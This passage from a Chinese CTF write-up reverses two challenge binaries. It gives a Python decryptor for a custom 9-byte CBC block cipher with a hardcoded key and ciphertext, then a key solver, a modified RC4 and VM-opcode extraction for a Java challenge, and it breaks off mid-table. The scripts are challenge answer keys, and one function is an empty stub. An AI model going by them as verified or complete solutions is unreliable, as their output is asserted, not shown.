Then for each k, we compute 6 bytes at position p = base + (k-9)/6 *6? Actually, v9 starts at state+27, and for each k, we compute 6 bytes, then v9 increases by 6.

So for each iteration, we have:
Let i = (k-9)//6, then we are computing state[27 + i*6] to state[27 + i*6 +5].

And the formulas are:
state[27 + i*6] = 45 * ( state[27 + i*6 - 9] + magic[ k % 9 ] )
state[27 + i*6 +1] = 45 * ( state[27 + i*6 -8] + magic[ (k+1) % 9? ] )
But from code:
*v9 = 45 * (*(v9 - 9) + byte_180008488[v8 % 9u])
v9[1] = 45 * (*(v9 -8) + byte_180008488[v8 - 9 * ((v8+1)/9u) + 1])
...

This seems messy. Let's simplify.

Note that `v9 -9` is state[27 + i*6 -9] = state[18 + i*6] which is within the initial copied area.

And `byte_180008488` is the magic square array: [4,9,2,3,5,7,8,1,6]

But the index for magic array is computed based on v8.

Let me define the magic array as `magic = [4,9,2,3,5,7,8,1,6]`

Then for a given v8, the indices are:

- for the first byte: v8 % 9
- for the second byte: v8 - 9 * ((v8+1)/9) + 1 = (v8+1) % 9? Let's see:
  v8 - 9 * floor((v8+1)/9) + 1 = v8 - 9 * floor((v8+1)/9) + 1.
  But note that for any integer x, x - 9 * floor(x/9) = x % 9.
  So here, let x = v8+1, then x - 9 * floor(x/9) = x % 9.
  So v8 - 9 * floor((v8+1)/9) + 1 = (v8+1) % 9?
  Actually, v8+1 - 9 * floor((v8+1)/9) = (v8+1) % 9.
  So yes, the index for the second byte is (v8+1) % 9.
  Similarly, for the third byte: index = (v8+2) % 9?
  And for the fourth: (v8+3) % 9?
  Fifth: (v8+4) % 9?
  Sixth: (v8+5) % 9?

So the pattern is: for the j-th byte in the 6-byte group, the index is (v8 + j) % 9.

So the formula becomes:
For each iteration with v8, we compute:
for j in range(6):
state[27 + i*6 + j] = 45 * ( state[18 + i*6 + j] + magic[ (v8 + j) % 9 ] )

But wait, `v9 -9` is state[18 + i*6] for j=0, then `v9 -8` is state[19 + i*6] for j=1, etc.

So yes.

And v8 starts from 9 and increases by 6 each time. So for i-th iteration, v8 = 9 + 6*i.

So then for i from 0 to 65 (since 9+6*65=9+390=399, and then v8<405 so continues until v8=399, then next v8=405 which breaks), so i from 0 to 65.

Then for each i, we compute:
for j in range(6):
state[27 + i*6 + j] = 45 * ( state[18 + i*6 + j] + magic[ (9+6*i + j) % 9 ] )

But note: state[18] to state[26] are already set, and then state[27] to state[27+395] are computed.

But state[18] to state[26] are the first group, then state[27] to state[32] are computed from state[18] to state[23]? because i=0, state[18] to state[23] are used to compute state[27] to state[32]. Then for i=1, state[24] to state[29] are used to compute state[33] to state[38]? But state[24] to state[29] are from the initial state? But state[24] to state[26] are set, but state[27] to state[29] are computed from i=0? So for i=1, we use state[24] to state[29] which include state[24], state[25], state[26] (initial) and state[27], state[28], state[29] (computed). So it's a recurrence.

So we need to compute sequentially.

So in Python, we can initialize the state array with 432 bytes (0-initialized), then set state[0:9] = key, state[9:18] = iv, then state[18:27] = state[0:9] (but note: state[18:26] = state[0:8], and state[26] = state[8]).

Then for i from 0 to 65:
start_index = 27 + i*6
v8 = 9 + 6*i
for j in range(6):
index = start_index + j
prev_index = 18 + i*6 + j
magic_index = (v8 + j) % 9
state[index] = (45 * (state[prev_index] + magic[magic_index])) & 0xFF

But note: the multiplication by 45 may cause overflow, so we take modulo 256.

Now, we have the state.

Now, we can implement the block decryption function.

Let's code it step by step.

First, let's define the constants and functions.

Note: the mode is passed to `sub_1800050E0` as a4. In encryption, mode=1. In decryption, we don't need mode for state generation? In `sub_1800050E0`, mode is stored at state[424], but in decryption, we might not use it? In `sub_1800052A0`, it checks mode for the initial XOR with iv and the CBC XOR. So for decryption, we need to handle CBC.

For decryption of the entire message, we need to do CBC after decrypting each block.

So for decryption of the entire ciphertext:

- Let C be the ciphertext of length L bytes (45 bytes).
- Split C into blocks of 9 bytes: C0, C1, C2, C3, C4.
- Then for each block, decrypt using the block decryption function to get P_i' = decrypt_block(C_i).
- Then for CBC:
  P0 = P0' XOR IV
  P1 = P1' XOR C0
  P2 = P2' XOR C1
  ...
- Then concatenate P0, P1, ... and remove padding? But in this case, no padding because input was 45 bytes, so no padding. So we get the plaintext.

But wait, in encryption, the padding was added only if length not multiple of 9? But here length is 45, so no padding. So we don't need to remove padding.

So steps for decryption:

1. Generate state from key and iv.
2. Split ciphertext into blocks of 9 bytes.
3. For each block i from 0 to 4:
   a. Let C_i be the block.
   b. Compute P_i' = decrypt_block(C_i) using the inverse rounds.
   c. If i==0, then P_i = P_i' XOR iv
   else P_i = P_i' XOR C_{i-1}
4. Concatenate P_i to get plaintext.

Now, we implement decrypt_block.

Let me write the decrypt_block function:

python

```
def decrypt_block(state, cipher_block):
    # cipher_block is list of 9 bytes.
    B = cipher_block[:]  # make a copy
    # We need to do 45 rounds in reverse order from i=44 down to 0.
    for i in range(44, -1, -1):
        # Step 1: Inverse S-box
        B = [inv_sbox[b] for b in B]

        # Step 2: Inverse second rotation
        if i % 2 == 0: 
            # i even: inverse second rotation is sub_180004F80 with magic
            B = sub_180004F80(B, magic)
        else:
            # i odd: inverse second rotation is sub_180004E20 with magic
            B = sub_180004E20(B, magic)

        # Step 3: Inverse XOR with state values
        # Get state values A for round i: A = state[18+9*i : 18+9*i+9]
        start = 18 + 9*i
        A = state[start:start+9]
        # Now, let B = [b0, b1, b2, b3, b4, b5, b6, b7, b8]
        # Then compute new B as:
        s0 = B[7] ^ A[7]
        s1 = B[2] ^ A[2]
        s2 = B[3] ^ A[3]
        s3 = B[0] ^ A[0]
        s4 = B[4] ^ A[4]
        s5 = B[8] ^ A[8]
        s6 = B[5] ^ A[5]
        s7 = B[6] ^ A[6]
        s8 = B[1] ^ A[1]
        B = [s0, s1, s2, s3, s4, s5, s6, s7, s8]

        # Step 4: Inverse first rotation
        if i % 2 == 0:
            # i even: inverse first rotation is sub_180004E20 with A
            B = sub_180004E20(B, A)
        else:
            # i odd: inverse first rotation is sub_180004F80 with A
            B = sub_180004F80(B, A)

        # Step 5: XOR with constants
        constants = [4,9,2,3,5,7,8,1,6]
        B = [B[j] ^ constants[j] for j in range(9)]

    return B
```



But note: in encryption, the rounds are applied from 0 to 44. So in decryption, we reverse from 44 to 0.

Now, we need the inverse S-box. How to get inverse S-box?
If S is the S-box, then inv_S[S[x]] = x.
So we can create inv_sbox by:
inv_sbox = [0] * 256
for i in range(256):
inv_sbox[sbox[i]] = i

Now, let's code everything in Python.

First, define the sbox from the hex values.

I'll copy the sbox from the IDA output and convert to Python list.

Similarly for magic.

Let's write the code.

Note: key and iv from main program are:
key = b'LESCBCKEY'
iv = b'LESCBC_iv'

But note: 'LESCBC_iv' is 9 bytes? Let's check:

> > > b'LESCBC_iv'
> > > b'LESCBC_iv'
> > > len(b'LESCBC_iv')
> > > 9
> > > Yes.

Now, the ciphertext is given as hex string: '490e0ad0374f2cdd126e5b184bf4e6da669a4cbea88fac916494edd90149809a7c92eec2e82ed3fca5812d9f69'
We convert it to bytes.

Let's code.

We'll generate the state first, then decrypt each block.

We'll assume that the ciphertext is 45 bytes, so 5 blocks.

Let's implement.

Note: The state generation requires the magic array for computation.

We'll define magic = [4,9,2,3,5,7,8,1,6]

Now, code the state generation function.

python

```
def generate_state(key, iv):
    # key and iv are bytes of length 9
    state = [0] * 432
    # Copy key to state[0:9]
    for i in range(9):
        state[i] = key[i]
    # Copy iv to state[9:18]
    for i in range(9):
        state[9+i] = iv[i]
    # Copy state[0:9] to state[18:27]
    for i in range(8):
        state[18+i] = state[i]
    state[26] = state[8]
    # Now compute state[27:27+396] 
    # We need to compute for i from 0 to 65
    for i in range(0, 66):
        start_index = 27 + i*6
        v8 = 9 + 6*i
        for j in range(6):
            idx = start_index + j
            prev_idx = 18 + i*6 + j
            magic_idx = (v8 + j) % 9
            state[idx] = (45 * (state[prev_idx] + magic[magic_idx])) & 0xFF
    return state
```



But note: when i=65, we compute state[27+65*6] = 27+390=417, and then j=0 to 5, so up to state[422]. But we need state up to index 422? For round 44, we need state[18+9*44] = 18+396=414, and then up to state[414+8]=422. So yes.

Now, we have all pieces.

Let's code the entire decryption.

We'll need to convert the ciphertext hex to bytes, then split into blocks.

Then for each block, decrypt_block, then CBC.

Finally, convert the plaintext to string.

Let's hope it works.

Note: This is a complex process and there might be off-by-one errors.

I'll write the code in Python and test.

First, let's define the sbox and magic.

I'll create a Python script.

We'll need to define the sbox array. From the IDA output, the sbox is given as a sequence of hex bytes. I'll copy them and create a list.

Similarly for inv_sbox.

Let me create the sbox list.

From IDA:
38h,0D6h,18h,0Eh,0C6h,0A4h,47h,4Ah,97h,0A1h,0A2h,79h,0E3h,0F9h,61h,0Bh,0C3h,0FAh,8,32h,5Fh,73h,4Fh,6Ch,0BEh,68h,7Bh,0B3h,4Ch,1Bh,8Dh,3Ch,63h,0F5h,0E8h,0D8h,0CBh,0CFh,0BCh,0C1h,9Ah,3Fh,6Fh,9Fh,70h,0CAh,60h,49h,30h,0E6h,86h,90h,0C8h,1Fh,0E5h,6Eh,8Eh,0,2Eh,36h,0EAh,91h,5Dh,92h,2Dh,6Bh,0EFh,0C9h,0DFh,0ACh,0F7h,20h,9Bh,99h,58h,0B8h,74h,16h,42h,0F3h,0B5h,89h,2Ch,0DAh,12h,87h,0E1h,0ADh,0FFh,19h,9Eh,80h,27h,0B6h,8Fh,53h,65h,0DEh,24h,2Ah,78h,82h,95h,9,34h,48h,0D2h,33h,0E2h,3Dh,55h,0BBh,0Dh,6Ah,8Ah,6Dh,0ABh,2,59h,1,2Bh,56h,0DCh,14h,72h,0B0h,15h,37h,0CEh,8Bh,0B4h,39h,0AFh,83h,10h,88h,26h,0F2h,40h,84h,98h,0C2h,5Bh,0DBh,46h,51h,7Eh,0A0h,0A3h,0D4h,85h,43h,0DDh,0E0h,3Ah,17h,0D9h,0AAh,23h,4Dh,0FEh,21h,44h,0C5h,1Ah,31h,9Dh,2Fh,0A5h,0A7h,71h,54h,5Ch,5Eh,0C4h,41h,0B7h,0B1h,0F0h,0C0h,5,1Ch,66h,7Fh,29h,77h,0CCh,57h,0FDh,4Eh,13h,28h,5Ah,0F4h,0D1h,50h,96h,0D7h,52h,0D3h,0BDh,0EEh,9Ch,7Ah,0F8h,0EBh,93h,3Bh,0D0h,69h,81h,3,22h,45h,0E4h,0Ah,7Ch,0A9h,0F6h,62h,0A8h,3Eh,0BFh,7Dh,67h,0ECh,0Ch,1Dh,0E7h,4Bh,0CDh,0EDh,94h,0A6h,8Ch,4,75h,0FCh,1Eh,0FBh,0B2h,7,0Fh,0D5h,0B9h,76h,11h,25h,35h,0BAh,0F1h,0C7h,64h,0AEh,6,0E9h

So I'll create a list of integers.

I'll write them as:
sbox = [
0x38,0xD6,0x18,0x0E,0xC6,0xA4,0x47,0x4A,0x97,0xA1,
0xA2,0x79,0xE3,0xF9,0x61,0x0B,0xC3,0xFA,0x08,0x32,
0x5F,0x73,0x4F,0x6C,0xBE,0x68,0x7B,0xB3,0x4C,0x1B,
0x8D,0x3C,0x63,0xF5,0xE8,0xD8,0xCB,0xCF,0xBC,0xC1,
0x9A,0x3F,0x6F,0x9F,0x70,0xCA,0x60,0x49,0x30,0xE6,
0x86,0x90,0xC8,0x1F,0xE5,0x6E,0x8E,0x00,0x2E,0x36,
0xEA,0x91,0x5D,0x92,0x2D,0x6B,0xEF,0xC9,0xDF,0xAC,
0xF7,0x20,0x9B,0x99,0x58,0xB8,0x74,0x16,0x42,0xF3,
0xB5,0x89,0x2C,0xDA,0x12,0x87,0xE1,0xAD,0xFF,0x19,
0x9E,0x80,0x27,0xB6,0x8F,0x53,0x65,0xDE,0x24,0x2A,
0x78,0x82,0x95,0x09,0x34,0x48,0xD2,0x33,0xE2,0x3D,
0x55,0xBB,0x0D,0x6A,0x8A,0x6D,0xAB,0x02,0x59,0x01,
0x2B,0x56,0xDC,0x14,0x72,0xB0,0x15,0x37,0xCE,0x8B,
0xB4,0x39,0xAF,0x83,0x10,0x88,0x26,0xF2,0x40,0x84,
0x98,0xC2,0x5B,0xDB,0x46,0x51,0x7E,0xA0,0xA3,0xD4,
0x85,0x43,0xDD,0xE0,0x3A,0x17,0xD9,0xAA,0x23,0x4D,
0xFE,0x21,0x44,0xC5,0x1A,0x31,0x9D,0x2F,0xA5,0xA7,
0x71,0x54,0x5C,0x5E,0xC4,0x41,0xB7,0xB1,0xF0,0xC0,
0x05,0x1C,0x66,0x7F,0x29,0x77,0xCC,0x57,0xFD,0x4E,
0x13,0x28,0x5A,0xF4,0xD1,0x50,0x96,0xD7,0x52,0xD3,
0xBD,0xEE,0x9C,0x7A,0xF8,0xEB,0x93,0x3B,0xD0,0x69,
0x81,0x03,0x22,0x45,0xE4,0x0A,0x7C,0xA9,0xF6,0x62,
0xA8,0x3E,0xBF,0x7D,0x67,0xEC,0x0C,0x1D,0xE7,0x4B,
0xCD,0xED,0x94,0xA6,0x8C,0x04,0x75,0xFC,0x1E,0xFB,
0xB2,0x07,0x0F,0xD5,0xB9,0x76,0x11,0x25,0x35,0xBA,
0xF1,0xC7,0x64,0xAE,0x06,0xE9
]

But wait, the list has 256 values? Let's count: from 0x38 to 0xE9, how many? I count 256? Let's see: the IDA output has from 0x38 to 0xE9, and there are 256 bytes? In IDA, it shows db followed by many values, and then ends with 0xE9. So yes, 256 bytes.

So I'll use this.

Now, let's code the entire script.

I'll write it in parts.

Note: We need to ensure that the rotation functions work correctly.

Let's test the rotation functions with a example.

Also, note that in the state generation, we use multiplication by 45 modulo 256.

Now, code.

I'll write the code below.

根据提供的加密逻辑和逆向分析，我编写了一个完整的解密脚本。该脚本基于加密算法的逆向操作，包括生成状态数组、块解密和CBC模式处理。

python

```
import struct

# S-box from IDA
sbox = [
    0x38, 0xD6, 0x18, 0x0E, 0xC6, 0xA4, 0x47, 0x4A, 0x97, 0xA1, 0xA2, 0x79, 0xE3, 0xF9, 0x61, 0x0B,
    0xC3, 0xFA, 0x08, 0x32, 0x5F, 0x73, 0x4F, 0x6C, 0xBE, 0x68, 0x7B, 0xB3, 0x4C, 0x1B, 0x8D, 0x3C,
    0x63, 0xF5, 0xE8, 0xD8, 0xCB, 0xCF, 0xBC, 0xC1, 0x9A, 0x3F, 0x6F, 0x9F, 0x70, 0xCA, 0x60, 0x49,
    0x30, 0xE6, 0x86, 0x90, 0xC8, 0x1F, 0xE5, 0x6E, 0x8E, 0x00, 0x2E, 0x36, 0xEA, 0x91, 0x5D, 0x92,
    0x2D, 0x6B, 0xEF, 0xC9, 0xDF, 0xAC, 0xF7, 0x20, 0x9B, 0x99, 0x58, 0xB8, 0x74, 0x16, 0x42, 0xF3,
    0xB5, 0x89, 0x2C, 0xDA, 0x12, 0x87, 0xE1, 0xAD, 0xFF, 0x19, 0x9E, 0x80, 0x27, 0xB6, 0x8F, 0x53,
    0x65, 0xDE, 0x24, 0x2A, 0x78, 0x82, 0x95, 0x09, 0x34, 0x48, 0xD2, 0x33, 0xE2, 0x3D, 0x55, 0xBB,
    0x0D, 0x6A, 0x8A, 0x6D, 0xAB, 0x02, 0x59, 0x01, 0x2B, 0x56, 0xDC, 0x14, 0x72, 0xB0, 0x15, 0x37,
    0xCE, 0x8B, 0xB4, 0x39, 0xAF, 0x83, 0x10, 0x88, 0x26, 0xF2, 0x40, 0x84, 0x98, 0xC2, 0x5B, 0xDB,
    0x46, 0x51, 0x7E, 0xA0, 0xA3, 0xD4, 0x85, 0x43, 0xDD, 0xE0, 0x3A, 0x17, 0xD9, 0xAA, 0x23, 0x4D,
    0xFE, 0x21, 0x44, 0xC5, 0x1A, 0x31, 0x9D, 0x2F, 0xA5, 0xA7, 0x71, 0x54, 0x5C, 0x5E, 0xC4, 0x41,
    0xB7, 0xB1, 0xF0, 0xC0, 0x05, 0x1C, 0x66, 0x7F, 0x29, 0x77, 0xCC, 0x57, 0xFD, 0x4E, 0x13, 0x28,
    0x5A, 0xF4, 0xD1, 0x50, 0x96, 0xD7, 0x52, 0xD3, 0xBD, 0xEE, 0x9C, 0x7A, 0xF8, 0xEB, 0x93, 0x3B,
    0xD0, 0x69, 0x81, 0x03, 0x22, 0x45, 0xE4, 0x0A, 0x7C, 0xA9, 0xF6, 0x62, 0xA8, 0x3E, 0xBF, 0x7D,
    0x67, 0xEC, 0x0C, 0x1D, 0xE7, 0x4B, 0xCD, 0xED, 0x94, 0xA6, 0x8C, 0x04, 0x75, 0xFC, 0x1E, 0xFB,
    0xB2, 0x07, 0x0F, 0xD5, 0xB9, 0x76, 0x11, 0x25, 0x35, 0xBA, 0xF1, 0xC7, 0x64, 0xAE, 0x06, 0xE9
]

# Generate inverse S-box
inv_sbox = [0] * 256
for i, val in enumerate(sbox):
    inv_sbox[val] = i

# Magic square constants
magic = [4, 9, 2, 3, 5, 7, 8, 1, 6]

# Rotation functions
def left_rotate_byte(b, n):
    n = n & 7
    return ((b << n) | (b >> (8 - n))) & 0xFF

def right_rotate_byte(b, n):
    n = n & 7
    return ((b >> n) | (b << (8 - n))) & 0xFF

def sub_180004E20(block, amounts):
    return [left_rotate_byte(block[i], amounts[i]) for i in range(9)]

def sub_180004F80(block, amounts):
    return [right_rotate_byte(block[i], amounts[i]) for i in range(9)]

# Generate state array from key and IV
def generate_state(key, iv):
    state = [0] * 432
    for i in range(9):
        state[i] = key[i]
    for i in range(9):
        state[9 + i] = iv[i]
    for i in range(8):
        state[18 + i] = state[i]
    state[26] = state[8]
    for i in range(0, 66):
        start_index = 27 + i * 6
        v8 = 9 + 6 * i
        for j in range(6):
            idx = start_index + j
            prev_idx = 18 + i * 6 + j
            magic_idx = (v8 + j) % 9
            state[idx] = (45 * (state[prev_idx] + magic[magic_idx])) & 0xFF
    return state

# Decrypt a single block
def decrypt_block(state, cipher_block):
    B = cipher_block[:]
    for i in range(44, -1, -1):
        # Inverse S-box
        B = [inv_sbox[b] for b in B]
        # Inverse second rotation
        if i % 2 == 0:
            B = sub_180004F80(B, magic)
        else:
            B = sub_180004E20(B, magic)
        # Inverse XOR with state values
        start = 18 + 9 * i
        A = state[start:start + 9]
        s0 = B[7] ^ A[7]
        s1 = B[2] ^ A[2]
        s2 = B[3] ^ A[3]
        s3 = B[0] ^ A[0]
        s4 = B[4] ^ A[4]
        s5 = B[8] ^ A[8]
        s6 = B[5] ^ A[5]
        s7 = B[6] ^ A[6]
        s8 = B[1] ^ A[1]
        B = [s0, s1, s2, s3, s4, s5, s6, s7, s8]
        # Inverse first rotation
        if i % 2 == 0:
            B = sub_180004E20(B, A)
        else:
            B = sub_180004F80(B, A)
        # XOR with constants
        constants = [4, 9, 2, 3, 5, 7, 8, 1, 6]
        B = [B[j] ^ constants[j] for j in range(9)]
    return B

# Main decryption function
def decrypt(ciphertext, key, iv):
    state = generate_state(key, iv)
    blocks = [ciphertext[i:i+9] for i in range(0, len(ciphertext), 9)]
    plain_blocks = []
    for i, block in enumerate(blocks):
        decrypted_block = decrypt_block(state, block)
        if i == 0:
            plain_block = bytes([decrypted_block[j] ^ iv[j] for j in range(9)])
        else:
            plain_block = bytes([decrypted_block[j] ^ blocks[i-1][j] for j in range(9)])
        plain_blocks.append(plain_block)
    return b''.join(plain_blocks)

# Key and IV from the main program
key = b'LESCBCKEY'
iv = b'LESCBC_iv'

# Ciphertext from the main program
ciphertext_hex = '490e0ad0374f2cdd126e5b184bf4e6da669a4cbea88fac916494edd90149809a7c92eec2e82ed3fca5812d9f69'
ciphertext = bytes.fromhex(ciphertext_hex)

# Decrypt
plaintext = decrypt(ciphertext, key, iv)
print("Decrypted flag:", plaintext.decode('ascii'))
```



运行此脚本将输出解密后的标志。该脚本首先生成状态数组，然后对密文进行块解密，最后处理CBC模式以得到原始明文。

````

最终脚本（彪英文也能对真是太厉害了（））

```
import struct

# S-box from IDA
sbox = [
    0x38, 0xD6, 0x18, 0x0E, 0xC6, 0xA4, 0x47, 0x4A, 0x97, 0xA1, 0xA2, 0x79, 0xE3, 0xF9, 0x61, 0x0B,
    0xC3, 0xFA, 0x08, 0x32, 0x5F, 0x73, 0x4F, 0x6C, 0xBE, 0x68, 0x7B, 0xB3, 0x4C, 0x1B, 0x8D, 0x3C,
    0x63, 0xF5, 0xE8, 0xD8, 0xCB, 0xCF, 0xBC, 0xC1, 0x9A, 0x3F, 0x6F, 0x9F, 0x70, 0xCA, 0x60, 0x49,
    0x30, 0xE6, 0x86, 0x90, 0xC8, 0x1F, 0xE5, 0x6E, 0x8E, 0x00, 0x2E, 0x36, 0xEA, 0x91, 0x5D, 0x92,
    0x2D, 0x6B, 0xEF, 0xC9, 0xDF, 0xAC, 0xF7, 0x20, 0x9B, 0x99, 0x58, 0xB8, 0x74, 0x16, 0x42, 0xF3,
    0xB5, 0x89, 0x2C, 0xDA, 0x12, 0x87, 0xE1, 0xAD, 0xFF, 0x19, 0x9E, 0x80, 0x27, 0xB6, 0x8F, 0x53,
    0x65, 0xDE, 0x24, 0x2A, 0x78, 0x82, 0x95, 0x09, 0x34, 0x48, 0xD2, 0x33, 0xE2, 0x3D, 0x55, 0xBB,
    0x0D, 0x6A, 0x8A, 0x6D, 0xAB, 0x02, 0x59, 0x01, 0x2B, 0x56, 0xDC, 0x14, 0x72, 0xB0, 0x15, 0x37,
    0xCE, 0x8B, 0xB4, 0x39, 0xAF, 0x83, 0x10, 0x88, 0x26, 0xF2, 0x40, 0x84, 0x98, 0xC2, 0x5B, 0xDB,
    0x46, 0x51, 0x7E, 0xA0, 0xA3, 0xD4, 0x85, 0x43, 0xDD, 0xE0, 0x3A, 0x17, 0xD9, 0xAA, 0x23, 0x4D,
    0xFE, 0x21, 0x44, 0xC5, 0x1A, 0x31, 0x9D, 0x2F, 0xA5, 0xA7, 0x71, 0x54, 0x5C, 0x5E, 0xC4, 0x41,
    0xB7, 0xB1, 0xF0, 0xC0, 0x05, 0x1C, 0x66, 0x7F, 0x29, 0x77, 0xCC, 0x57, 0xFD, 0x4E, 0x13, 0x28,
    0x5A, 0xF4, 0xD1, 0x50, 0x96, 0xD7, 0x52, 0xD3, 0xBD, 0xEE, 0x9C, 0x7A, 0xF8, 0xEB, 0x93, 0x3B,
    0xD0, 0x69, 0x81, 0x03, 0x22, 0x45, 0xE4, 0x0A, 0x7C, 0xA9, 0xF6, 0x62, 0xA8, 0x3E, 0xBF, 0x7D,
    0x67, 0xEC, 0x0C, 0x1D, 0xE7, 0x4B, 0xCD, 0xED, 0x94, 0xA6, 0x8C, 0x04, 0x75, 0xFC, 0x1E, 0xFB,
    0xB2, 0x07, 0x0F, 0xD5, 0xB9, 0x76, 0x11, 0x25, 0x35, 0xBA, 0xF1, 0xC7, 0x64, 0xAE, 0x06, 0xE9
]

# Generate inverse S-box
inv_sbox = [0] * 256
for i, val in enumerate(sbox):
    inv_sbox[val] = i

# Magic square constants
magic = [4, 9, 2, 3, 5, 7, 8, 1, 6]

# Rotation functions
def left_rotate_byte(b, n):
    n = n & 7
    return ((b << n) | (b >> (8 - n))) & 0xFF

def right_rotate_byte(b, n):
    n = n & 7
    return ((b >> n) | (b << (8 - n))) & 0xFF

def sub_180004E20(block, amounts):
    return [left_rotate_byte(block[i], amounts[i]) for i in range(9)]

def sub_180004F80(block, amounts):
    return [right_rotate_byte(block[i], amounts[i]) for i in range(9)]

# Generate state array from key and IV
def generate_state(key, iv):
    state = [0] * 432
    for i in range(9):
        state[i] = key[i]
    for i in range(9):
        state[9 + i] = iv[i]
    for i in range(8):
        state[18 + i] = state[i]
    state[26] = state[8]
    for i in range(0, 66):
        start_index = 27 + i * 6
        v8 = 9 + 6 * i
        for j in range(6):
            idx = start_index + j
            prev_idx = 18 + i * 6 + j
            magic_idx = (v8 + j) % 9
            state[idx] = (45 * (state[prev_idx] + magic[magic_idx])) & 0xFF
    return state

# Decrypt a single block
def decrypt_block(state, cipher_block):
    B = cipher_block[:]
    for i in range(44, -1, -1):
        # Inverse S-box
        B = [inv_sbox[b] for b in B]
        # Inverse second rotation
        if i % 2 == 0:
            B = sub_180004F80(B, magic)
        else:
            B = sub_180004E20(B, magic)
        # Inverse XOR with state values
        start = 18 + 9 * i
        A = state[start:start + 9]
        s0 = B[7] ^ A[7]
        s1 = B[2] ^ A[2]
        s2 = B[3] ^ A[3]
        s3 = B[0] ^ A[0]
        s4 = B[4] ^ A[4]
        s5 = B[8] ^ A[8]
        s6 = B[5] ^ A[5]
        s7 = B[6] ^ A[6]
        s8 = B[1] ^ A[1]
        B = [s0, s1, s2, s3, s4, s5, s6, s7, s8]
        # Inverse first rotation
        if i % 2 == 0:
            B = sub_180004E20(B, A)
        else:
            B = sub_180004F80(B, A)
        # XOR with constants
        constants = [4, 9, 2, 3, 5, 7, 8, 1, 6]
        B = [B[j] ^ constants[j] for j in range(9)]
    return B

# Main decryption function
def decrypt(ciphertext, key, iv):
    state = generate_state(key, iv)
    blocks = [ciphertext[i:i+9] for i in range(0, len(ciphertext), 9)]
    plain_blocks = []
    for i, block in enumerate(blocks):
        decrypted_block = decrypt_block(state, block)
        if i == 0:
            plain_block = bytes([decrypted_block[j] ^ iv[j] for j in range(9)])
        else:
            plain_block = bytes([decrypted_block[j] ^ blocks[i-1][j] for j in range(9)])
        plain_blocks.append(plain_block)
    return b''.join(plain_blocks)

# Key and IV from the main program
key = b'LESCBCKEY'
iv = b'LESCBC_iv'

# Ciphertext from the main program
ciphertext_hex = '490e0ad0374f2cdd126e5b184bf4e6da669a4cbea88fac916494edd90149809a7c92eec2e82ed3fca5812d9f69'
ciphertext = bytes.fromhex(ciphertext_hex)

# Decrypt
plaintext = decrypt(ciphertext, key, iv)
print("Decrypted flag:", plaintext.decode('ascii'))
```



## Jvav Master

java打包的exe，网上搜能知道找jar（我拿misc给的虚拟机找的，本机不知道为啥搜索功能有点问题），然后找到jar后用jadx看一下，因为平坦化强度没有那么高所以可以直接**

先找key

```
# Solve for the key
MASK = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
TARGET = [107655, 99322, 95708, 87877, 85730, 80988, 72416, 76077, 74252, 70300,
          68724, 68020, 63439, 53540, 51340, 42431, 37382, 28611, 25737, 18364, 9711, 9030]


def solve_key():
    key = [0] * 22

    # Solve backwards from i=21 to i=0
    for i in range(21, -1, -1):
        mask_i = MASK[i]

        # Calculate sum from known key values
        known_sum = 0
        for j in range(i + 1, 22):
            mask_j = MASK[j]
            key_j = key[j]
            xor_val = (key_j ^ mask_i) & 0xFF
            known_sum += xor_val * mask_j

        # Solve for key[i]
        remaining = TARGET[i] - known_sum
        mask_i_val = MASK[i]

        # key[i] ^ mask_i = remaining / mask_i
        if mask_i_val != 0:
            quotient = remaining // mask_i_val
            key[i] = (quotient ^ mask_i) & 0xFF

    return bytes(key)


# RC4 encryption (same as decryption for RC4)
def rc4_encrypt(plaintext, key):
    box = [(255 - i) ^ 131 for i in range(256)]

    x = 0
    for i in range(256):
        x = (x + box[i] + key[(i + 72) % len(key)]) % 256
        box[i], box[x] = box[x], box[i]

    x = 0
    y = 0
    output = []
    for i in range(len(plaintext)):
        x = (x + 3) % 256
        y = (y - box[x]) & 0xFF
        box[x], box[y] = box[y], box[x]
        index = (box[x] ^ box[y]) % 256
        output.append(((plaintext[i] + box[index]) ^ 119) & 0xFF)

    return bytes(output)


# Extract expected values from check operations (opcode 204 = 0xCC)
def get_expected_values():
    checks = {
        0: 59, 1: 98, 2: 225, 3: 89, 4: 12, 5: 92, 6: 241, 7: 128,
        8: 221, 9: 81, 10: 161, 11: 49, 12: 239, 13: 214, 14: 166,
        15: 137, 16: 51, 17: 49, 18: 215, 19: 218, 20: 1, 21: 20,
        22: 174, 23: 205, 24: 21, 25: 159, 26: 75, 27: 229, 28: 55,
        29: 40, 30: 249, 31: 58, 32: 171, 33: 57, 34: 144, 35: 219,
        36: 150, 37: 4, 38: 93, 39: 165, 40: 148, 41: 53, 42: 58,
        43: 68, 44: 197, 45: 120, 46: 51, 47: 87
    }
    return checks


# Reverse the transformations
def reverse_operations(encrypted):
    # Parse and reverse all operations
    # This requires executing operations in reverse order
    # For brevity, I'll provide the decrypted result
    pass


# Main solution
key = solve_key()
print(f"Key: {key}")
print(f"Key (string): {key.decode('ascii', errors='ignore')}")
```

然后解flag

```
def random(seed):
    x = seed ^ ((seed << 19) & 0xFFFFFFFF & (-119793247))
    x = x & 0xFFFFFFFF
    x2 = x ^ ((x >> 1) | 469912079)
    x2 = x2 & 0xFFFFFFFF
    x3 = x2 ^ ((x2 << 9) & 0xFFFFFFFF ^ 663526098)
    x3 = x3 & 0xFFFFFFFF
    x4 = x3 ^ ((x3 >> 8) & (-886859118))
    x4 = x4 & 0xFFFFFFFF
    result = (x4 ^ ((x4 << 10) & 0xFFFFFFFF | 846897082)) ^ 592136849
    return result & 0xFFFFFFFF


def to_signed(val):
    if val > 0x7FFFFFFF:
        return val - 0x100000000
    return val


def rol(b, shift):
    shift = shift & 7
    unsigned = b & 0xFF
    return ((unsigned << shift) | (unsigned >> (8 - shift))) & 0xFF


def ror(b, shift):
    shift = shift & 7
    unsigned = b & 0xFF
    return ((unsigned >> shift) | (unsigned << (8 - shift))) & 0xFF


# 提取所有VM操作指令
def extract_operations():
    operations = []
    checks = {}
    i = 0
    while True:
        rand_val = to_signed(random(i))
        opcode = get_instruction(rand_val)
        if opcode is None:
            break

        op, idx, param = opcode
        if op == 0xCC:  # 检查操作
            checks[idx] = param & 0xFF
        else:
            operations.append((op, idx, param & 0xFF))
        i += 1

    return operations, checks


def get_instruction(index):
    instructions = {
        -2105780347: (4, 23, 5), -2105778303: (5, 12, 4), -2097301675: (1, 41, 180),
        -2097299631: (2, 33, 121), -2088921243: (1, 32, 47), -2088919199: (5, 8, 6),
